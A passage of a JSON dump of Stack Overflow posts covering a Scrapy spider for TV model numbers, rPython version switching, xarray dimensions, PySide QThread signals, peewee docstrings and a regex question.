"user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463004122, "post_id": 37173628, "comment_id": 61882674, "body": "Ah ok, that we can work with,  the start is always matching yes?"}, {"owner": {"reputation": 163, "user_id": 6261281, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/ba0278dfbabd0c26510c9640e2f9538a?s=128&d=identicon&r=PG&f=1", "display_name": "Wouter", "link": "https://stackoverflow.com/users/6261281/wouter"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463004375, "post_id": 37173628, "comment_id": 61882783, "body": "Not really it can be KDL55 or KDL-55 or KD55 or KD-55"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463005256, "post_id": 37173628, "comment_id": 61883115, "body": "So only the L can be missing? How about removing the L and - from both then using str.startswith"}], "owner": {"reputation": 163, "user_id": 6261281, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/ba0278dfbabd0c26510c9640e2f9538a?s=128&d=identicon&r=PG&f=1", "display_name": "Wouter", "link": "https://stackoverflow.com/users/6261281/wouter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1463002290, "creation_date": 1463002290, "question_id": 37173628, "link": "https://stackoverflow.com/questions/37173628/python-spider-extract-info-from-list-with-partial-match", "title": "Python Spider: Extract info from list with partial match", "body": "<p>I have a list of all the current tv models. As an example I'm using the Sony tv models. The official models look like this:</p>\n\n<p>KDL40W705CBAEP \nKDL55W755CBAEP \nKD75XD8505BAEP \nKDL40WD650BAEP</p>\n\n<p>With my script, see below, I managed to get everything match as long as the text on the webpage is a 100% match.</p>\n\n<p>The issue I'm having is that some models are put on the website as followed</p>\n\n<p>KDL40W705 CBAEP \nKDL55-W755 CBAEP \nKD75XD8505 \nKDL40 WD650BAEP</p>\n\n<p>How can I get those matched aswell?</p>\n\n<pre><code>import scrapy.selector \nimport urlparse\nfrom scrapy.spiders import Spider\nfrom scrapy.http import Request\nfrom MediaMarkt.items import MediamarktItem\n\nmodels = []\nfor line in open(\"Sonytv.txt\", \"r\"):\n    models.append(line.strip(\"\\n\\-\"))\nd = {}\nfor model in models:\n    d[model] = True\n\ndef complete_url(string):\n    return \"http://www.mediamarkt.de\"+ string\n\n\ndef encode(str):\n    return str.encode('utf8', 'ignore') \n\n\nclass MshbeSpider(Spider):\n    name = \"mshdetv\"\n    start_urls = ['http://www.mediamarkt.de/mcs/productlist/_led-lcd-fernseher,48353,460668.html?langId=-3&amp;searchParams=&amp;sort=&amp;view=&amp;page=']\n\n    def parse(self, response):  \n        items = response.xpath('//ul[@class=\"products-list\"]/li/div')\n        for item in items:\n            mshtv = MediamarktItem()\n            mshtv['item_3_price'] = encode(item.xpath('normalize-space(.//aside/div/div/div/text())').extract()[0]).replace(\"-\",\"\")\n            mshtv['item_2_name'] = encode(item.xpath('normalize-space(.//div/h2/a/text())').extract()[0])\n            mshtv['item_a_link'] = item.select('.//div/h2/a/@href').extract()\n            mshtv['item_4_avai'] = encode(item.xpath('normalize-space(.//aside/div/div/ul/li//text())').extract()[0])\n            #mshtv['item_1_cat'] = encode(item.xpath('normalize-space(//*[@id=\"category\"]/hgroup/h1/text())').extract()[0])\n            for word in mshtv['item_2_name'].split(\" \"):\n                if word in d:\n                    mshtv['item_model'] = word            \n            yield mshtv\n\n\n        new_link = response.xpath('//li[@class=\"pagination-next\"]/a/@href').extract()[0]\n        yield Request(complete_url(new_link),callback=self.parse)\n</code></pre>\n"}, {"tags": ["python", "r", "version", "rpython"], "answers": [{"tags": [], "owner": {"reputation": 94, "user_id": 7970943, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-F4RRIC_IFiY/AAAAAAAAAAI/AAAAAAAAAD4/dI34yJTyPxQ/photo.jpg?sz=128", "display_name": "Bartimus", "link": "https://stackoverflow.com/users/7970943/bartimus"}, "is_accepted": false, "score": 1, "last_activity_date": 1501615835, "last_edit_date": 1501615835, "creation_date": 1501608569, "answer_id": 45444293, "question_id": 37173597, "link": "https://stackoverflow.com/questions/37173597/change-version-of-python-in-rpython/45444293#45444293", "title": "Change version of python in rPython?", "body": "<p>One way is to reinstall the rPython-package and specify which python version to use:</p>\n\n<pre><code># Lets assume it is already connected to python 3.5.3\nlibrary(rPython)                                                                                                                                                                                                                                                     \npython.exec(\"import sys\")                                                                                                                                                                                                                                            \npython.exec(\"print (sys.version)\")                                                                                                                                                                                                                                   \n# 3.5.3 (default, Jan 19 2017, 14:11:04)                                                                                                                                                                                                                                 \n# [GCC 6.3.0 20170118]\n\n# Now lets connect it instead to python 2.7.13                                                                                                                                                                                                                                                   \ndetach(\"package:rPython\", unload=TRUE)                                                                                                                                                                                                                               \ninstall.packages(\"rPython\",lib= \"/home/userid/R/x86_64-pc-linux-gnu-library/3.4\", configure.vars= \"RPYTHON_PYTHON_VERSION=2\")\n# omitted install reporting of rPython for space #\nlibrary(rPython)                                                                                                                                                                                                                                                     \npython.exec(\"import sys\")                                                                                                                                                                                                                                            \npython.exec(\"print (sys.version)\")                                                                                                                                                                                                                                   \n# 2.7.13 (default, Jan 19 2017, 14:48:08)                                                                                                                                                                                                                                \n# [GCC 6.3.0 20170118]                   \n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5759126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ce4b131c5e333b3d2e8cf98d8aa41e?s=128&d=identicon&r=PG&f=1", "display_name": "Jonathan Chiang", "link": "https://stackoverflow.com/users/5759126/jonathan-chiang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 565, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1501615835, "creation_date": 1463002153, "question_id": 37173597, "link": "https://stackoverflow.com/questions/37173597/change-version-of-python-in-rpython", "title": "Change version of python in rPython?", "body": "<p>I'm trying to run tensor flow with rPython in RStudio and rPython uses a different version of python than the one in my terminal. </p>\n\n<p>How do you change which version rPython uses?</p>\n"}, {"tags": ["python", "python-xarray"], "comments": [{"owner": {"reputation": 4534, "user_id": 3064736, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/wuMUa.jpg?s=128&g=1", "display_name": "Maximilian", "link": "https://stackoverflow.com/users/3064736/maximilian"}, "edited": false, "score": 0, "creation_date": 1463060003, "post_id": 37173580, "comment_id": 61909607, "body": "Thanks for the question. If you can post fully reproducible examples that makes it a bit easier to engage with. I&#39;ll have a look later either way though"}, {"owner": {"reputation": 1477, "user_id": 684543, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ab0acfdca2f52bd204780ed1be5247fc?s=128&d=identicon&r=PG", "display_name": "badgley", "link": "https://stackoverflow.com/users/684543/badgley"}, "reply_to_user": {"reputation": 4534, "user_id": 3064736, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/wuMUa.jpg?s=128&g=1", "display_name": "Maximilian", "link": "https://stackoverflow.com/users/3064736/maximilian"}, "edited": false, "score": 0, "creation_date": 1463420258, "post_id": 37173580, "comment_id": 62046561, "body": "@Maximilian made a few edits to support copy/paste -- I don&#39;t often ask questions here so would appreciate any further edits/style changes you think might help."}, {"owner": {"reputation": 4534, "user_id": 3064736, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/wuMUa.jpg?s=128&g=1", "display_name": "Maximilian", "link": "https://stackoverflow.com/users/3064736/maximilian"}, "edited": false, "score": 1, "creation_date": 1463422960, "post_id": 37173580, "comment_id": 62048018, "body": "Stephen gave the ideal answer, so I won&#39;t attempt to beat it. Thanks for the edits, much better... If you really want another refinement for the future, your lines of code could be in blocks (notice how Stephan does them below)"}], "answers": [{"comments": [{"owner": {"reputation": 1477, "user_id": 684543, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ab0acfdca2f52bd204780ed1be5247fc?s=128&d=identicon&r=PG", "display_name": "badgley", "link": "https://stackoverflow.com/users/684543/badgley"}, "edited": false, "score": 0, "creation_date": 1463540181, "post_id": 37193213, "comment_id": 62103462, "body": "I ended up going with the second approach -- this allowed me the flexibility to keep my lat/lng data as a 360x720 array and cut out a few extra steps I&#39;d made for myself in my original formulation of the problem."}], "tags": [], "owner": {"reputation": 7287, "user_id": 809705, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/93a76a800ef6c5919baa8ba91120ee98?s=128&d=identicon&r=PG", "display_name": "shoyer", "link": "https://stackoverflow.com/users/809705/shoyer"}, "is_accepted": true, "score": 12, "last_activity_date": 1463072529, "creation_date": 1463072529, "answer_id": 37193213, "question_id": 37173580, "link": "https://stackoverflow.com/questions/37173580/add-constant-dimension-to-xarray-dataset/37193213#37193213", "title": "Add &#39;constant&#39; dimension to xarray Dataset", "body": "<p>Your first example is pretty close:</p>\n\n<pre><code>lats = np.arange(-89.75, 90, 0.5) * -1\nlngs = np.arange(-179.75, 180, 0.5)\ncoords =  {'lat': lats, 'lng': lngs}\ncoords['time'] = [datetime.datetime(year, month, day)]\nda = xr.DataArray(data, coords=coords, dims=['lat', 'lng', 'time'])\nda.to_dataset(name='variable_name')\n</code></pre>\n\n<p>You'll notice a few changes in my version:</p>\n\n<ol>\n<li>I'm passing in a first for the 'time' coordinate instead of a scalar. You need to pass in a list or 1d array to get a 1D coordinate variable, which is what you need if you also use 'time' as a dimension. That's what the error <code>ValueError: Coordinate objects must be 1-dimensional</code> is trying to tell you (by the way -- if you have ideas for how to make that error message more helpful, I'm all ears!).</li>\n<li>I'm providing a <code>dims</code> argument to the DataArray constructor. Passing in a (non-ordered) dictionary is a little dangerous because the iteration order is not guaranteed.</li>\n<li>I also switched to <code>datetime.datetime</code> instead of <code>pd.datetime</code>. The later is simply an alias for the former.</li>\n</ol>\n\n<hr>\n\n<p>Another sensible approach is to use <code>concat</code> with a list of one item once you've added 'time' as a scalar coordinate, e.g.,</p>\n\n<pre><code>lats = np.arange(-89.75, 90, 0.5) * -1\nlngs = np.arange(-179.75, 180, 0.5)\ncoords =  {'lat': lats, 'lng': lngs, 'time': datetime.datetime(year, month, day)}\nda = xr.DataArray(data, coords=coords, dims=['lat', 'lng'])\nexpanded_da = xr.concat([da], 'time')\n</code></pre>\n\n<p>This version generalizes nicely to joining together data from a bunch of days -- you simply make the list of DataArrays longer. In my experience, most of the time the reason why you want the extra dimension in the first place is to be able to able to concat along it. Length 1 dimensions are not very useful otherwise.</p>\n"}, {"tags": [], "owner": {"reputation": 354, "user_id": 8211365, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d3d79ec69696aca6939ed5cbba2ac6b?s=128&d=identicon&r=PG&f=1", "display_name": "tejasvi88", "link": "https://stackoverflow.com/users/8211365/tejasvi88"}, "is_accepted": false, "score": 2, "last_activity_date": 1595343688, "creation_date": 1595343688, "answer_id": 63017423, "question_id": 37173580, "link": "https://stackoverflow.com/questions/37173580/add-constant-dimension-to-xarray-dataset/63017423#63017423", "title": "Add &#39;constant&#39; dimension to xarray Dataset", "body": "<p>You can use <code>.expand_dims()</code> to add a new dimension and <code>.assign_coords()</code> to add coordinate values for the corresponding dimension. Below code adds <code>new_dim</code> dimension to <code>ds</code> dataset and sets a corresponding corrdinate with the <code>list_of_values</code> you provide.</p>\n<pre><code>expanded_ds = ds.expand_dims(&quot;new_dim&quot;).assign_coords(new_dim=(&quot;new_dim&quot;, [list_of_values]))\n</code></pre>\n"}], "owner": {"reputation": 1477, "user_id": 684543, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ab0acfdca2f52bd204780ed1be5247fc?s=128&d=identicon&r=PG", "display_name": "badgley", "link": "https://stackoverflow.com/users/684543/badgley"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2729, "favorite_count": 2, "accepted_answer_id": 37193213, "answer_count": 2, "score": 5, "last_activity_date": 1595343688, "creation_date": 1463002076, "last_edit_date": 1463540002, "question_id": 37173580, "link": "https://stackoverflow.com/questions/37173580/add-constant-dimension-to-xarray-dataset", "title": "Add &#39;constant&#39; dimension to xarray Dataset", "body": "<p>I have a series of monthly gridded datasets in CSV form. I want to read them, add a few dimensions, and then write to netcdf. I've had great experience using xarray (xray) in the past so thought I'd use if for this task. </p>\n\n<p>I can easily get them into a 2D DataArray with something like:</p>\n\n<pre><code>data = np.ones((360,720))\nlats = np.arange(-89.75, 90, 0.5) * -1\nlngs = np.arange(-179.75, 180, 0.5)\ncoords =  {'lat': lats, 'lng':lngs}\nda = xr.DataArray(data, coords=coords)\n</code></pre>\n\n<p>But when I try to add another dimension, which would convey information about time (all data is from the same year/month), things start to go sour. </p>\n\n<p>I've tried two ways to crack this: </p>\n\n<p>1) expand my input data to m x n x 1, something like: </p>\n\n<pre><code>data = np.ones((360,720))\nlats = np.arange(-89.75, 90, 0.5) * -1\nlngs = np.arange(-179.75, 180, 0.5)\ncoords =  {'lat': lats, 'lng':lngs}\ndata = data[:,:,np.newaxis]\n</code></pre>\n\n<p>Then I follow the same steps as above, with coords updated to contain a third dimension.</p>\n\n<pre><code>lats = np.arange(-89.75, 90, 0.5) * -1\nlngs = np.arange(-179.75, 180, 0.5)\ncoords =  {'lat': lats, 'lng':lngs}\ncoords['time'] = pd.datetime(year, month, day))\nda = xr.DataArray(data, coords=coords)\nda.to_dataset(name='variable_name')\n</code></pre>\n\n<p>This is fine for creating a DataArray -- but when I try to convert to a dataset (so I can write to netCDF), I get an error about 'ValueError: Coordinate objects must be 1-dimensional' </p>\n\n<p>2) The second approach I've tried is taking my dataarray, casting it to a dataframe, setting the index to ['lat','lng', 'time'] and then going back to a dataset with <code>xr.Dataset.from_dataframe()</code>. I've tried this -- but it takes 20+ min before I kill the process.</p>\n\n<p>Does anyone know how I can get a Dataset with a monthly 'time' dimension? </p>\n"}, {"tags": ["python", "multithreading", "python-2.7", "pyside", "qthread"], "comments": [{"owner": {"reputation": 8840, "user_id": 2319400, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/9Ckyw.png?s=128&g=1", "display_name": "sebastian", "link": "https://stackoverflow.com/users/2319400/sebastian"}, "edited": false, "score": 1, "creation_date": 1463039841, "post_id": 37173560, "comment_id": 61894776, "body": "Check the docs: <a href=\"http://doc.qt.io/qt-4.8/qthread.html#details\" rel=\"nofollow noreferrer\">doc.qt.io/qt-4.8/qthread.html#details</a> just below the <code>WorkerThread</code> example. It provides some more explanation to why slots on QThreads don&#39;t work as one might expect."}, {"owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "reply_to_user": {"reputation": 8840, "user_id": 2319400, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/9Ckyw.png?s=128&g=1", "display_name": "sebastian", "link": "https://stackoverflow.com/users/2319400/sebastian"}, "edited": false, "score": 0, "creation_date": 1463051806, "post_id": 37173560, "comment_id": 61903336, "body": "@sebastian Thanks! I read that a couple times before, now it makes more sense."}, {"owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "reply_to_user": {"reputation": 8840, "user_id": 2319400, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/9Ckyw.png?s=128&g=1", "display_name": "sebastian", "link": "https://stackoverflow.com/users/2319400/sebastian"}, "edited": false, "score": 0, "creation_date": 1463067258, "post_id": 37173560, "comment_id": 61915459, "body": "I am now convinced to use the worker model."}], "answers": [{"comments": [{"owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "edited": false, "score": 1, "creation_date": 1463067232, "post_id": 37180256, "comment_id": 61915434, "body": "I am now entirely convinced to use the worker model."}], "tags": [], "owner": {"reputation": 10344, "user_id": 1994235, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc318537facc47ebe1ae98a7aabacecf?s=128&d=identicon&r=PG", "display_name": "three_pineapples", "link": "https://stackoverflow.com/users/1994235/three-pineapples"}, "is_accepted": true, "score": 5, "last_activity_date": 1463038612, "last_edit_date": 1495540723, "creation_date": 1463038612, "answer_id": 37180256, "question_id": 37173560, "link": "https://stackoverflow.com/questions/37173560/pyside-passing-signals-from-qthread-to-a-slot-in-another-qthread/37180256#37180256", "title": "PySide passing signals from QThread to a slot in another QThread", "body": "<p>The problem is because you have overridden <code>QThread.run()</code>. The <code>run</code> method by default contains an implementation that handles signal processing. </p>\n\n<p>If you want to use signals/slots correctly you should subclass <code>QObject</code>, put your code in a method in there, and use <code>moveToThread()</code> to move the <code>QObject</code> to a base instance of <code>QThread</code> that you instantiate. You can then run your code by connecting your method to the <code>QThread.started</code> signal and then calling <code>thread.start()</code></p>\n\n<p>You can then repeat the creation of the child thread in a similar way, by putting that code in the method of the <code>QObject</code> previously created and launched in the thread. Signals and slots you connect there will be made between the thread and it's child thread correctly.</p>\n\n<p><a href=\"https://stackoverflow.com/a/35534047/1994235\">This</a> is a good example of proper communication between the main thread and a <code>QThread</code>, but you could easily extend it to between <code>QThreads</code>. Just modify the <code>MyWorker.firstWork()</code> method to launch a new <code>QThread</code> like is already done in the <code>setupThread</code> method.</p>\n"}], "owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1045, "favorite_count": 2, "accepted_answer_id": 37180256, "answer_count": 1, "score": 3, "last_activity_date": 1463038612, "creation_date": 1463001971, "last_edit_date": 1463007831, "question_id": 37173560, "link": "https://stackoverflow.com/questions/37173560/pyside-passing-signals-from-qthread-to-a-slot-in-another-qthread", "title": "PySide passing signals from QThread to a slot in another QThread", "body": "<blockquote>\n  <p>I solved my issue by moving the <code>mySubQThread</code> <code>run()</code> into the <code>myQThread</code> <code>run()</code></p>\n  \n  <p>That said, I still would like to know why what I was attempting before didn't work.</p>\n</blockquote>\n\n<p>I'm pretty new to threading. I am running into this issue and I think I may be approaching things wrong, anyway here goes. I am open to a different approach I know this may be a bit convoluted to follow.</p>\n\n<p>I have a GUI that makes a new derived <code>QThread</code> lets call it <code>myQThread</code> within that thread, I am running through a process that creates another thread call it <code>mySubQThread</code> the issue I am having is as follows, I have signals defined in my GUI for example: <code>signalA = QtCore.Signal(int)</code> and a slot in <code>myQThread</code> The slot in the <code>mySubQThread</code> never seems to get the signal.</p>\n\n<p>Here is a working example. (modified somewhat)</p>\n\n<pre><code>from PySide import QtCore, QtGui\nimport time\n\n\n\nclass myQThread(QtCore.QThread):\n    myThreadSignal = QtCore.Signal(int)\n    def __init__(self, parent):\n        super(myQThread, self).__init__(parent=parent)\n\n    def run(self):\n        self.subThread = mySubQThread(parent=self)\n        self.myThreadSignal.connect(self.subThread.sub_thread_slot)\n        self.myThreadSignal.connect(self.test_slot)\n        print \"starting subthread...\"\n        self.subThread.start()\n\n        while self.subThread.isRunning():\n            print \"myQThread is alive!\"\n            time.sleep(1)\n        print \"myQThread exiting run...\"\n    @QtCore.Slot(int)\n    def my_thread_slot(self, a):\n        print \"1b) Made it here!\"\n        self.myThreadSignal.emit(a)\n\n    @QtCore.Slot(int)\n    def test_slot(self, a):\n        print \"2a) Made it here!\"\n\nclass mySubQThread(QtCore.QThread):\n    mySubSignalA = QtCore.Signal(int)\n    def __init__(self, parent):\n        super(mySubQThread, self).__init__(parent=parent)\n        self._abort = False\n    def run(self):\n        #Do some processing\n        #Wait for signal\n        self._abort = False\n        while not self._abort:\n            print \"mySubQThread is alive!\"\n            time.sleep(1)\n        print \"mySubQThread exiting run...\"\n\n    @QtCore.Slot(int)\n    def sub_thread_slot(self, a):\n        print \"2b)Never make it here!\"\n        self._abort = True\n\n\nclass myWidget(QtGui.QWidget):\n    myWidgetSignal = QtCore.Signal(int)\n    def __init__(self, parent=None):\n        super(myWidget, self).__init__(parent=parent)\n        #simple Widget to test this out....\n        myLayout = QtGui.QVBoxLayout()\n        self.runButton = QtGui.QPushButton(\"run\")\n        self.runButton.clicked.connect(self.run_button_pressed)\n\n        self.otherButton = QtGui.QPushButton(\"other\")\n        self.otherButton.clicked.connect(self.other_button_pressed)\n\n        myLayout.addWidget(self.runButton)\n        myLayout.addWidget(self.otherButton)\n\n        self.setLayout(myLayout)\n    @QtCore.Slot()\n    def run_button_pressed(self):\n        self.processThread = myQThread(self)\n        self.myWidgetSignal.connect(self.processThread.my_thread_slot)\n        self.myWidgetSignal.connect(self.test_slot)\n        self.processThread.start()\n    @QtCore.Slot()\n    def other_button_pressed(self):\n        self.myWidgetSignal.emit(1)\n\n    @QtCore.Slot(int)\n    def test_slot(self, a):\n        print \"1a) Made it here!\"\n\nif __name__ == \"__main__\":\n    import sys\n    myApp = QtGui.QApplication(sys.argv)\n    myWin = myWidget()\n    myWin.show()\n    sys.exit(myApp.exec_())\n</code></pre>\n\n<p>Here is some sample output: </p>\n\n<p>Note that if you change the line:</p>\n\n<pre><code>        self.subThread = mySubQThread(parent=self)\n</code></pre>\n\n<p>to</p>\n\n<pre><code>        self.subThread = mySubQThread(parent=None)\n</code></pre>\n\n<p>it stops complaining as it does in the sample output. neither shows that it makes it to 2B</p>\n\n<pre><code>QObject: Cannot create children for a parent that is in a different thread.\n(Parent is myQThread(0x3c3faf0), parent's thread is QThread(0x2792548), current thread is myQThread(0x3c3faf0)\nstarting subthread...\nmyQThread is alive!mySubQThread is alive!\n\nmySubQThread is alive!\nmyQThread is alive!\n1b) Made it here!\n2a) Made it here!\n1a) Made it here!\n</code></pre>\n"}, {"tags": ["python", "python-sphinx", "peewee"], "comments": [{"owner": {"reputation": 41716, "user_id": 407651, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e1f48e20177ed6c4c3197a9a92f48e5?s=128&d=identicon&r=PG", "display_name": "mzjn", "link": "https://stackoverflow.com/users/407651/mzjn"}, "edited": false, "score": 0, "creation_date": 1463028934, "post_id": 37173528, "comment_id": 61889319, "body": "Related: <a href=\"http://stackoverflow.com/q/27337534/407651\">stackoverflow.com/q/27337534/407651</a> and <a href=\"http://stackoverflow.com/questions/22451195/sphinx-autodoc-include-subfunctions\" title=\"sphinx autodoc include subfunctions\">stackoverflow.com/questions/22451195/&hellip;</a>"}, {"owner": {"reputation": 985, "user_id": 3835948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/747c13ebadc9f0c860110aec544b26e9?s=128&d=identicon&r=PG&f=1", "display_name": "Randrian", "link": "https://stackoverflow.com/users/3835948/randrian"}, "reply_to_user": {"reputation": 41716, "user_id": 407651, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e1f48e20177ed6c4c3197a9a92f48e5?s=128&d=identicon&r=PG", "display_name": "mzjn", "link": "https://stackoverflow.com/users/407651/mzjn"}, "edited": false, "score": 0, "creation_date": 1463037787, "post_id": 37173528, "comment_id": 61893489, "body": "I already found the first one, but unfortunately it wasn&#39;t helpful. I see that the nested classes are not considered good python syntax, but peewee somehow seems to force me to use it. Isn&#39;t there a sort of canonical way to document peewee models? I am probably not the only one who tries to document code which uses peewee."}], "owner": {"reputation": 985, "user_id": 3835948, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/747c13ebadc9f0c860110aec544b26e9?s=128&d=identicon&r=PG&f=1", "display_name": "Randrian", "link": "https://stackoverflow.com/users/3835948/randrian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 61, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1463028868, "creation_date": 1463001806, "last_edit_date": 1463028868, "question_id": 37173528, "link": "https://stackoverflow.com/questions/37173528/peewee-doctrings-for-model", "title": "Peewee doctrings for model", "body": "<p>I have a class that uses a peewee model.</p>\n\n<pre><code>import peewee\n\nclass MyDatabase:\n   def __init__(self, database_filename):\n      self.db = peewee.SqliteDatabase(database_filename)\n\n      class BaseModel(peewee.Model):\n            class Meta:\n                database = self.db\n\n      class CustomModel(BaseModel):\n            my_int = peewee.IntegerField(default=0)\n</code></pre>\n\n<p>Now I want to document (using the Sphinx autoclass function) the CustomModel and I haven't found out what the best method should be.</p>\n\n<p>Sure I could move CustomModel out of the MyDatabase class, but then I would need a global database variable which is not a good thing if I want to have this script importable. Any maybe the user wants to open multiple Sqlite database files, so a global database variable might be a bad idea and for this case the nested class structure should be the best, shouldn't it?</p>\n"}, {"tags": ["python", "regex"], "comments": [{"owner": {"reputation": 16763, "user_id": 2749397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/rcNMz.png?s=128&g=1", "display_name": "gboffi", "link": "https://stackoverflow.com/users/2749397/gboffi"}, "edited": false, "score": 3, "creation_date": 1463001989, "post_id": 37173523, "comment_id": 61881775, "body": "The regex you show DOES NOT match &#39;RoboCop Nakamoto\u2019"}, {"owner": {"reputation": 13033, "user_id": 4029014, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/ndZhu.jpg?s=128&g=1", "display_name": "aghast", "link": "https://stackoverflow.com/users/4029014/aghast"}, "edited": false, "score": 0, "creation_date": 1463002031, "post_id": 37173523, "comment_id": 61881793, "body": "Show us your code, please?"}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "reply_to_user": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 1, "creation_date": 1463002219, "post_id": 37173523, "comment_id": 61881885, "body": "@user6188402: Or alternatively, <code>\\b</code> to indicate explicit word boundaries within a larger block of test. But yes, the code is necessary; which <code>re</code> functions are used, the arguments passed, whether or not you&#39;re using raw strings (ALWAYS USE RAW STRINGS WITH PYTHON REGULAR EXPRESSIONS!!!!!), it all matters a lot. The Python pattern defined with <code>r&#39;\\b[A-Z][a-zA-Z]*\\sNakamoto\\b&#39;</code> should work just fine as the pattern argument to <code>re.search</code> to handle the requirements given, but small coding mistakes could break it."}, {"owner": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 0, "creation_date": 1463002369, "post_id": 37173523, "comment_id": 61881938, "body": "To match <code>RoboCop Nakamoto</code>, you will need to say the first part of your regex can happen from 1 to 2(for example): <code>^([A-Z][a-z]+){1,2}\\sNakamoto$</code>"}, {"owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "edited": false, "score": 0, "creation_date": 1463002424, "post_id": 37173523, "comment_id": 61881968, "body": "Here is what your RegEx is saying: Match one capital letter, then match one or more lowercase letters, then match a space then match Nakamoto. Check out this site, it has helped me a lot in debugging regex: <a href=\"https://regex101.com/#python\" rel=\"nofollow noreferrer\">regex101.com/#python</a>"}, {"owner": {"reputation": 233, "user_id": 5592910, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/41ef88686975b205709a4e3262ad72c0?s=128&d=identicon&r=PG&f=1", "display_name": "user92592", "link": "https://stackoverflow.com/users/5592910/user92592"}, "edited": false, "score": 0, "creation_date": 1463002445, "post_id": 37173523, "comment_id": 61881980, "body": "The source code used can be found in this gist: <a href=\"https://gist.github.com/anonymous/d80acd4b5beaa10f77275d9ec0dfd976\" rel=\"nofollow 